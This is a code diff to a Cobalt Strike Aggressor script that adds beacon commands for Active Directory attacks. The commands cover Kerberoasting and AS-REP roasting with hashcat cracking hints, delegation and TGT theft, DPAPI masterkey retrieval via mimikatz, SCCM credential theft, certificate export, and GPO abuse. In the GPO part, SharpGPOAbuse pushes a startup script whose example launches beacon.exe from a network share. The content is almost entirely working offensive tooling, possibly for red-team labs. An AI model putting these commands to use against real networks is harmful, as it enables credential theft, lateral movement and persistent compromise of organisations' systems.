@@ -190,7 +190,7 @@ beacon_command_register(
     "Opens the port specified"
 );
 
-#EXECUTE ASSEMBLY ALIAS
+#EXECUTE ASSEMBLY ALIASES
 alias rubeus {
     $size = size(@_);
     $args = join(" ", sublist(@_, 1, $size));
@@ -251,8 +251,30 @@ beacon_command_register(
     "Execute Assmembly of SharpSpoolTrigger",
     "Execute Assmembly of SharpSpoolTrigger"
 )
+
+#SITUATIONAL AWARENESS FUNCTIONS
+## FIND DOMAIN SHARES
+alias get_domainShares {
+    $size = size(@_);
+    if ( $size == 1) {
+        $command = 'Find-DomainShare -CheckShareAccess';
+    } else if ( $size == 2) {
+        $domain = @_[1];
+        $command = 'Find-DomainShare -CheckShareAccess -ComputerDomain ' . $domain;
+    } else {
+        berror($1, "Invalid Parameters!");
+        return;
+    }
+    bpowerpick($1, $command);
+}
+beacon_command_register (
+    "get_domainShares",
+    "Uses PowerView to find Domain Shares and check perms",
+    "Uses PowerView to find Domain Shares and check perms\n\n"
+    . "Usage: get_domainShares (domain)"
+)
 #KERBEROASTING
-#FIND TARGETS
+##FIND TARGETS
 alias kerberos_roast_findtargets {
     bpowerpick($1, 'Get-NetUser -SPN | select serviceprincipalname,userprincipalname');
 }
@@ -262,7 +284,7 @@ beacon_command_register(
     "User PowerView to find SPNs"
 );
 
-#GRABBING KRB5TGS HASH
+##GRABBING KRB5TGS HASH
 sub kerberos_roast_tgsreq_cb{
     blog($1, $2);
     blog($1, "Cracking with Hashcat:'hashcat -a 0 -m 13100 hashes.txt wordlist.txt'");
@@ -277,7 +299,7 @@ beacon_command_register(
 );
 
 #AS-REP ROASTING
-#FIND TARGETS
+##FIND TARGETS
 alias kerberos_asreproast_findtargets {
    bexecute_assembly($1, $ADSEARCH_PATH, '--search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname');
 }
@@ -287,7 +309,7 @@ beacon_command_register(
     "Find AS-REP roastable targets"
 );
 
-#REQUEST HASH
+##REQUEST HASH
 sub asreproast_requesthash_cb {
     blog($1, $2);
     blog($1, "Cracking with Hashcat:'hashcat -a 0 -m 18200 hashes.txt wordlist.txt'");
@@ -303,7 +325,7 @@ beacon_command_register(
 );
 
 #UNCONSTRAINED DELEGATION
-#FINDING TARGETS
+##FINDING TARGETS
 alias kerberos_unconstdel_findtargets {
     # bexecute_assembly($1, $ADSEARCH_PATH, '--search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname')
     bexecute_assembly($1, $ADSEARCH_PATH, '--search "(userAccountControl:1.2.840.113556.1.4.803:=524288)" --attributes samaccountname,dnshostname')
@@ -315,7 +337,7 @@ beacon_command_register(
 )
 
 #CONSTRAINED DELEGATION
-#FINDING TARGETS
+##FINDING TARGETS
 alias kerberos_constdel_findtargets {
     # bexecute_assembly($1, $ADSEARCH_PATH, "--search \"(&(objectCategory=computer)(msds-allowedtodelegateto=\*))\" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json")
     bexecute_assembly($1, $ADSEARCH_PATH, "--search \"(msds-allowedtodelegateto=\*)\" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json")
@@ -325,7 +347,7 @@ beacon_command_register(
     "Find Constrained Delegation Targets"
 );
 
-#TRIAGE THEN DUMP TGT
+##TRIAGE THEN DUMP TGT
 sub constdel_stealtgt_cb {
     #Arguments: $1 = beacon ID, $2 = results, $3 = information map
     local('$hostname $regx_luid $luid');
@@ -358,14 +380,13 @@ beacon_command_register(
 );
 
 #ROLE BASED CONSTRAINED DELEGATION
-#FINDING TARGETS.
+##FINDING TARGETS.
 sub kerberos_rbcd_findtargets_cb {
     local('$regex $sid $command');
     blog($1,$2);
 
     $regex = '(.*)-513';
     $sid = matches($2, $regex)[0];
-
     blog($1, "Targetting SID: " . $sid);
 
     $command = 'Get-DomainComputer |'
@@ -594,12 +615,6 @@ beacon_command_register("dpapi_findcredfiles", "Locate DPAPI Vaults w/ Seatbelt"
 
 ###REQUEST MASTERKEY FROM DC VIA RPC
 alias dpapi_reqBackupMasterKey {
-    #   C:\Users
-    #$2 \bfarmer (username)
-    #   \AppData\Roaming\Microsoft\Protect
-    #$3 \S-1-5-21-569305411-121244042-2357301523-1104 (User SID)
-    #$4 \bfc5090d-22fe-4058-8953-47f6882f549e (Master Key)
-    
     $credpath = "C:\\Users\\ $+ $2 $+ \\AppData\\Roaming\\Microsoft\\Protect\\ $+ $3 $+ \\ $+ $4 $+ ";
     println("CredPath: " . $credpath);
     bmimikatz($1, "@dpapi::masterkey /in: $+ $credpath $+  /rpc");
@@ -693,17 +708,55 @@ beacon_command_register(
     "Look for vulnerable ADCS templates"
 );
 
+##FIND LOCAL CERTIFICATES
+alias adcs_checklocalcerts{
+    # bexecute_assembly($1, $CERTIFY_PATH, "find /vulnerable");
+    bexecute_assembly($1, $SEATBELT_PATH, "Certficates");
+}
+beacon_command_register(
+    "adcs_checklocalcerts",
+    "Check for local User Certs",
+    "Check for local User Certs\n\n"
+    . "Can export certs with \'mimikatz crypto::certificates /export\'\n"
+);
+
 #GPO ABUSE METHODS
 ##FIND MODIFIABLE GPOs
-alias gpo_findvulngpos {
-    #bpowershell_import($1, $POWERVIEW_PATH);
-    $command = 'Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }';
+sub gpo_findvulngpos_cb {
+    local('$command')
+    blog($1, $2);
+    
+    $regex = '(.*)-513';
+    $sid = matches($2, $regex)[0];
+    blog($1, "Targetting SID: " . $sid);
+
+    $command = 'Get-DomainGPO'
+    . ' | Get-DomainObjectAcl -ResolveGUIDs'
+    . ' | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "'
+    . $sid
+    . '-[\d]{4,10}" }';
     bpowerpick($1, $command);
+}
+alias gpo_findvulngpos {
+    $command = 'Convert-NameToSid "Domain Users"';
+    bpowerpick($1, $command, $null, $null, &gpo_findvulngpos_cb)
 }
 beacon_command_register(
     "gpo_findvulngpos",
+    "Use PowerPick to find modifiable GPOs",
     "Use PowerPick to find modifiable GPOs"
 );
+alias gpo_getdetails {
+    $gpodn = @_[1];
+    $command = "Get-DomainGPO -Identity \"" . $gpodn . "\" | select displayName, gpcFileSysPath";
+    bpowerpick($1, $command);
+}
+beacon_command_register(
+    "gpo_getdetails",
+    "Returns DisplayName & GPC File Path for a GPO ND",
+    "Returns DisplayName & GPC File Path for a GPO ND"
+    . "Usage: gpo_getdetails [GPO DN]"
+)
 alias gpo_locategpo {
     #bpowershell_import($1, $POWERVIEW_PATH);
     $command = "Get-DomainGPO -Identity \" $+ $2 $+ \" | select displayname,gpcfilesyspath";
@@ -723,13 +776,92 @@ beacon_command_register(
     "Use PowerPick to find modifiable GPOs",
     "Usage: gpo_convertfromsid [SID]"
 );
+alias gpo_checklinks {
+    $guid = @_[1];
+    $command = "Get-DomainOU -GPLink \"\{" . $guid . "\}\" | select name,distinguishedname";
+    bpowerpick($1, $command);
+}
+beacon_command_register(
+    "gpo_checklinks",
+    "Use PowerPick to find GPO Links",
+    "Use PowerPick to find GPO Links\n\n"
+    . "Usage: gpo_checklinks [GPO GUID]"
+);
+alias gpo_listOuMembers {
+    $dn = @_[1];
+    $command = "Get-DomainComputer -SearchBase \"" . $dn . "\" | select dnsHostName";
+    bpowerpick($1, $command);
+}
+beacon_command_register(
+    "gpo_listOuMembers",
+    "Use PowerPick to find Computer in an OU",
+    "Use PowerPick to find Computer in an OU\n\n"
+    . "Usage: gpo_listOuMembers [OU DN]"
+);
 alias gpo_sharpgpoabuse {
-    bexecute_assembly($1, $SHARPGPOABUSE_PATH, $2);
+    $size = size(@_);
+    $args = join(" ", sublist(@_, 1, $size));
+    bexecute_assembly($1, $SHARPGPOABUSE_PATH, $args);
 }
 beacon_command_register(
     "gpo_sharpgpoabuse",
     "Calls SharGPOAbuse.exe",
-    "Usage: gpo_sharpgpoabuse \"<command>\""
+    "Usage: gpo_sharpgpoabuse <command>"
+)
+alias gpo_addComputerScript {
+    $size = size(@_);
+
+    if ( $size >= 3) {
+        $GPOName    = @_[1];
+        $scriptname = rand_alphanum(5) . ".bat";
+        $script     = join(" ", sublist(@_, 2, $size));
+        $parameters    = "--AddComputerScript"
+        . " --GPOName \"" . $GPOName . "\""
+        . " --ScriptName " . $scriptname
+        . " --ScriptContents \"" . $script . "\""
+    } else {
+        berror($1, "Invalid Parameters!");
+        return;
+    }
+    bexecute_assembly($1, $SHARPGPOABUSE_PATH, $parameters)
+}
+beacon_command_register(
+    "gpo_addComputerScript",
+    "Uses SharpGPOAbuse to add computer script to OU",
+    "Uses SharpGPOAbuse to add computer script to OU\n\n"
+    . "Usage:gpo_addComputerScript [GPO Name] [script contents]\n\n"
+    . "Example:\n"
+    . "gpo_addComputerScript \"Vulnerbale GPO\" start /b \\\\host.domain.local\\openshare\\beacon.exe\n"
+)
+sub gpo_checkcreateandlink_cb {
+    blog($1, "Targetting Domain: " $2);
+
+    $string = replace($2, '\.', ",DC=");
+    $string = replace($string, "\n", "");
+    $dn = 'CN=Policies,CN=System,DC=' . $string;
+
+    $createchild_command = 'Write-host "Groups that can create GPOS:";'
+    . ' Get-DomainObjectAcl -Identity "' . $dn . '"'
+    . ' -ResolveGUIDs | ? { $_.ObjectAceType -eq '
+    . '"Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | '
+    . '% { ConvertFrom-SID $_.SecurityIdentifier }';
+
+    $link_command = 'Write-host "Groups that can Link GPOS:";'
+    . ' Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl';
+    
+    $command = $createchild_command . ';' . $link_command;
+    bpowerpick($1, $command);
+    
+}
+alias gpo_checkcreateandlink {
+    $command = "Get-Domain | select -expand Name";
+    bpowerpick($1, $command, $null, $null, &gpo_checkcreateandlink_cb);
+}
+beacon_command_register(
+    "gpo_checkcreateandlink",
+    "Use PowerView to check for groups with GPO Create perms",
+    "Use PowerView to check for groups with GPO Create perms\n\n"
+    . "Use Windows PowerShell RSAT tools to create new GPOs\n"
 )
 
 #MSSQL HELPERS
@@ -1126,23 +1258,38 @@ beacon_command_register(
 
 ##Get Network Access Account Creds
 alias sccm_getnaacreds {
-    if(-isadmin $1){
-        $args = "local naa -m wmi --no-banner";
-        bexecute_assembly($1, $SHARPSCCM_PATH, $args);
-    }
-    else
-    {
-        berror($1, "Must be run as an admin user!");
+    $size   = size(@_);
+    if ( $size == 2 ) {
+        $source = @_[1];
+        if(-isadmin $1){
+            if ($source ismatch "local") {
+                $args = "local naa -m wmi --no-banner";
+            } else if ($source ismatch "server") {
+                $args = "get naa --no-banner";
+            } else {
+                berror($1, "Unknown Arguement: " . $source);
+                return;
+            }
+        } else {
+            berror($1, "Must be run as an admin user!");
+            return;
+        }
+        
+    } else {
+        berror($1, "Invalid Paramters!");
         return;
     }
+    
+    bexecute_assembly($1, $SHARPSCCM_PATH, $args);
 }
 beacon_command_register(
     "sccm_getnaacreds",
     "Get SCCM NAA Creds",
-    "Get SCCM NAA Creds using SharpSCCM\n"
-    . "Requirements:\n"
-    . "  Administrator Access\n"
-    . "  Not use SMB Beacon"
+    "Get SCCM NAA Creds using SharpSCCM\n\n"
+    . "Usage: sccm_getnaacreds [local|server]\n"
+    . "  Requirements:\n"
+    . "    Administrator Access\n"
+    . "    Not use SMB Beacon"
 )
 
 ## MASS LATERAL MOVEMENT!
